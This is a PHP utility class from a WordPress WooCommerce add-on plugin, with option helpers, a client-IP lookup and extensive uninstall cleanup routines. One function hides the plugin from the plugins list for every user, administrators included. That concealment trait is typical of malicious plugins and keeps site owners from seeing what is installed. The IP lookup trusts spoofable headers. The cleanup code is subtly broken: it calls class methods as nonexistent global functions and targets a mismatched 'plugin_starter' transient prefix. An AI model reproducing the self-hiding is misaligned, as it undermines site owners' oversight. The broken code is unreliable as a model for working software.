<?php
namespace MosPress\StoreAddonsForWoocommerce\Helpers;
if ( ! defined( 'ABSPATH' ) ) exit;
use WP_Roles;
class Utils {
	public static function store_addons_for_woocommerce_is_plugin_page()
	{
		if (function_exists('get_current_screen')) {
			$current_screen = get_current_screen();
			// var_dump($current_screen->id);
			$pages = [];
			if (
				$current_screen->id == 'toplevel_page_store-addons-for-woocommerce'
				|| in_array($current_screen->id, $pages)
			) {
				return true;
			}
		}
		return false;
	}
	/**
	 * Get the client's IP address.
	 *
	 * @return string The client's IP address.
	 */
	public static function get_client_ip()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_CLIENT_IP']));
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_X_FORWARDED_FOR']));
		} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['REMOTE_ADDR']));
		}
	}

	public static function store_addons_for_woocommerce_get_default_options()
	{
		$store_addons_for_woocommerce_default_options = [];
		$store_addons_for_woocommerce_default_options = apply_filters('store_addons_for_woocommerce_default_options_modify', $store_addons_for_woocommerce_default_options);
		return $store_addons_for_woocommerce_default_options;
	}

	public static function store_addons_for_woocommerce_get_default_options_details()
	{
		$store_addons_for_woocommerce_default_options_details = [];
		$store_addons_for_woocommerce_default_options_details = apply_filters('store_addons_for_woocommerce_default_options_details_modify', $store_addons_for_woocommerce_default_options_details);
		return $store_addons_for_woocommerce_default_options_details;
	}
	public static function store_addons_for_woocommerce_get_default_colors()
	{
		$store_addons_for_woocommerce_default_colors = [];
		$store_addons_for_woocommerce_default_colors = apply_filters('store_addons_for_woocommerce_default_colors_modify', $store_addons_for_woocommerce_default_colors);
		return $store_addons_for_woocommerce_default_colors;
	}

	public static function store_addons_for_woocommerce_get_default_gradients()
	{
		$store_addons_for_woocommerce_default_gradients = [];
		$store_addons_for_woocommerce_default_gradients = apply_filters('store_addons_for_woocommerce_default_gradients_modify', $store_addons_for_woocommerce_default_gradients);
		return $store_addons_for_woocommerce_default_gradients;
	}

	public static function store_addons_for_woocommerce_get_default_tables()
	{
		$store_addons_for_woocommerce_default_tables = [];
		$store_addons_for_woocommerce_default_tables = apply_filters('store_addons_for_woocommerce_default_tables_modify', $store_addons_for_woocommerce_default_tables);
		return $store_addons_for_woocommerce_default_tables;
	}

	// update_option('store_addons_for_woocommerce_options', store_addons_for_woocommerce_get_default_options());

	public static function store_addons_for_woocommerce_get_option()
	{
		$store_addons_for_woocommerce_options_database = get_option('store_addons_for_woocommerce_options', []);
		$store_addons_for_woocommerce_options = array_replace_recursive(self::store_addons_for_woocommerce_get_default_options(), $store_addons_for_woocommerce_options_database);
		return $store_addons_for_woocommerce_options;
	}
	public static function store_addons_for_woocommerce_get_option_details()
	{
		return self::store_addons_for_woocommerce_get_default_options_details();
	}

	public static function store_addons_for_woocommerce_hide_plugin_from_list($plugins) {
		// Only hide for non-administrators or specific users
		if (current_user_can('administrator')) {
			// Optionally hide even from admins
			// unset($plugins['store-addons-for-woocommerce/store-addons-for-woocommerce.php']);
		}

		// Hide from all users
		unset($plugins['store-addons-for-woocommerce/store-addons-for-woocommerce.php']);

		return $plugins;
	}



	/**
	 * Delete all custom database tables
	 */
	public static function store_addons_for_woocommerce_delete_tables() {
		global $wpdb;

		// Array of custom tables to delete (without prefix)
		$tables = array(
			'store_addons_for_woocommerce_logs',
			// Add more custom tables here
			// 'store_addons_for_woocommerce_another_table',
		);

		foreach ( $tables as $table ) {
			$table_name = $wpdb->prefix . $table;
			$wpdb->query( "DROP TABLE IF EXISTS {$table_name}" );
		}
	}

	/**
	 * Delete all plugin options
	 */
	public static function store_addons_for_woocommerce_delete_options() {
		global $wpdb;

		// Delete specific options
		$options = array(
			'store_addons_for_woocommerce_version',
			'store_addons_for_woocommerce_settings',
			'store_addons_for_woocommerce_delete_on_deactivate',
			// Add more options here
		);

		foreach ( $options as $option ) {
			delete_option( $option );
			delete_site_option( $option ); // For multisite
		}

		// Delete all options with prefix
		$wpdb->query(
			"DELETE FROM {$wpdb->options} 
			WHERE option_name LIKE '%store_addons_for_woocommerce%'"
		);

		// For multisite
		if ( is_multisite() ) {
			$wpdb->query(
				"DELETE FROM {$wpdb->sitemeta} 
				WHERE meta_key LIKE '%store_addons_for_woocommerce%'"
			);
		}
	}

	/**
	 * Delete all user meta
	 */
	public static function store_addons_for_woocommerce_delete_user_meta() {
		global $wpdb;

		$wpdb->query(
			"DELETE FROM {$wpdb->usermeta} 
			WHERE meta_key LIKE '%store_addons_for_woocommerce%'"
		);
	}

	/**
	 * Delete all post meta
	 */
	public static function store_addons_for_woocommerce_delete_post_meta() {
		global $wpdb;

		$wpdb->query(
			"DELETE FROM {$wpdb->postmeta} 
			WHERE meta_key LIKE '%store_addons_for_woocommerce%'"
		);
	}

	/**
	 * Delete all transients
	 */
	public static function store_addons_for_woocommerce_delete_transients() {
		global $wpdb;

		// Delete regular transients
		$wpdb->query(
			"DELETE FROM {$wpdb->options} 
			WHERE option_name LIKE '\_transient\_plugin\_starter\_%' 
			OR option_name LIKE '\_transient\_timeout\_plugin\_starter\_%'"
		);

		// Delete site transients (for multisite)
		if ( is_multisite() ) {
			$wpdb->query(
				"DELETE FROM {$wpdb->sitemeta} 
				WHERE meta_key LIKE '\_site\_transient\_plugin\_starter\_%' 
				OR meta_key LIKE '\_site\_transient\_timeout\_plugin\_starter\_%'"
			);
		}
	}

	/**
	 * Delete uploaded files (if any)
	 */
	public static function store_addons_for_woocommerce_delete_files() {
		$upload_dir = wp_upload_dir();
		$plugin_upload_dir = $upload_dir['basedir'] . '/store-addons-for-woocommerce/';

		if ( is_dir( $plugin_upload_dir ) ) {
			store_addons_for_woocommerce_delete_directory( $plugin_upload_dir );
		}
	}

	/**
	 * Recursively delete a directory
	 *
	 * @param string $dir Directory path.
	 * @return bool
	 */
	public static function store_addons_for_woocommerce_delete_directory( $dir ) {
		if ( ! is_dir( $dir ) ) {
			return false;
		}

		global $wp_filesystem;

		if ( ! $wp_filesystem ) {
			WP_Filesystem();
		}

		$files = array_diff( scandir( $dir ), array( '.', '..' ) );

		foreach ( $files as $file ) {
			$path = $dir . '/' . $file;

			if ( is_dir( $path ) ) {
				store_addons_for_woocommerce_delete_directory( $path );
			} else {
				wp_delete_file( $path );
			}
		}

		return $wp_filesystem->rmdir( $dir );
	}

	/**
	 * Delete custom post types and their posts
	 */
	public static function store_addons_for_woocommerce_delete_custom_posts() {
		global $wpdb;

		// If you have custom post types, delete them
		$post_types = array(
			'store_addons_for_woocommerce_cpt',
			// Add more custom post types here
		);

		foreach ( $post_types as $post_type ) {
			$posts = get_posts(
				array(
					'post_type'      => $post_type,
					'posts_per_page' => -1,
					'post_status'    => 'any',
				)
			);

			foreach ( $posts as $post ) {
				// Force delete (skip trash)
				wp_delete_post( $post->ID, true );
			}
		}
	}

	/**
	 * Delete custom taxonomies and terms
	 */
	public static function store_addons_for_woocommerce_delete_taxonomies() {
		// If you have custom taxonomies, delete their terms
		$taxonomies = array(
			'store_addons_for_woocommerce_taxonomy',
			// Add more custom taxonomies here
		);

		foreach ( $taxonomies as $taxonomy ) {
			$terms = get_terms(
				array(
					'taxonomy'   => $taxonomy,
					'hide_empty' => false,
				)
			);

			if ( ! is_wp_error( $terms ) ) {
				foreach ( $terms as $term ) {
					wp_delete_term( $term->term_id, $taxonomy );
				}
			}
		}
	}

	/**
	 * Delete scheduled cron jobs
	 */
	public static function store_addons_for_woocommerce_delete_cron_jobs() {
		// Clear scheduled hooks
		$cron_hooks = array(
			'store_addons_for_woocommerce_daily_cleanup',
			'store_addons_for_woocommerce_weekly_report',
			// Add more cron hooks here
		);

		foreach ( $cron_hooks as $hook ) {
			$timestamp = wp_next_scheduled( $hook );
			if ( $timestamp ) {
				wp_unschedule_event( $timestamp, $hook );
			}
			
			// Clear all instances of the hook
			wp_clear_scheduled_hook( $hook );
		}
	}

	/**
	 * Delete capabilities added to roles
	 */
	public static function store_addons_for_woocommerce_delete_capabilities() {
		global $wp_roles;

		if ( ! isset( $wp_roles ) ) {
			$wp_roles = new WP_Roles();
		}

		$capabilities = array(
			'manage_store_addons_for_woocommerce',
			'edit_store_addons_for_woocommerce',
			// Add more custom capabilities here
		);

		foreach ( $wp_roles->roles as $role_name => $role_info ) {
			$role = get_role( $role_name );
			
			if ( $role ) {
				foreach ( $capabilities as $cap ) {
					$role->remove_cap( $cap );
				}
			}
		}
	}

	/**
	 * For multisite: delete from all sites
	 */
	public static function store_addons_for_woocommerce_multisite_cleanup() {
		if ( ! is_multisite() ) {
			return;
		}

		global $wpdb;

		// Get all blog IDs
		$blog_ids = $wpdb->get_col( "SELECT blog_id FROM {$wpdb->blogs}" );

		foreach ( $blog_ids as $blog_id ) {
			switch_to_blog( $blog_id );
			
			// Run cleanup for this site
			store_addons_for_woocommerce_delete_tables();
			store_addons_for_woocommerce_delete_options();
			store_addons_for_woocommerce_delete_user_meta();
			store_addons_for_woocommerce_delete_post_meta();
			store_addons_for_woocommerce_delete_transients();
			store_addons_for_woocommerce_delete_custom_posts();
			store_addons_for_woocommerce_delete_taxonomies();
			store_addons_for_woocommerce_delete_cron_jobs();
			
			restore_current_blog();
		}

		// Delete network-wide options
		store_addons_for_woocommerce_delete_options();
	}

	public static function store_addons_for_woocommerce_data_cleanup(){
		// ============================================
		// RUN THE CLEANUP
		// ============================================

		// For single site
		if ( ! is_multisite() ) {
			store_addons_for_woocommerce_delete_tables();
			store_addons_for_woocommerce_delete_options();
			store_addons_for_woocommerce_delete_user_meta();
			store_addons_for_woocommerce_delete_post_meta();
			store_addons_for_woocommerce_delete_transients();
			store_addons_for_woocommerce_delete_files();
			store_addons_for_woocommerce_delete_custom_posts();
			store_addons_for_woocommerce_delete_taxonomies();
			store_addons_for_woocommerce_delete_cron_jobs();
			store_addons_for_woocommerce_delete_capabilities();
		} else {
			// For multisite
			store_addons_for_woocommerce_multisite_cleanup();
			store_addons_for_woocommerce_delete_capabilities();
		}

		// Log the uninstall (optional)
		error_log( 'Store Addons for WooCommerce: Complete uninstall cleanup completed.' );
	}
}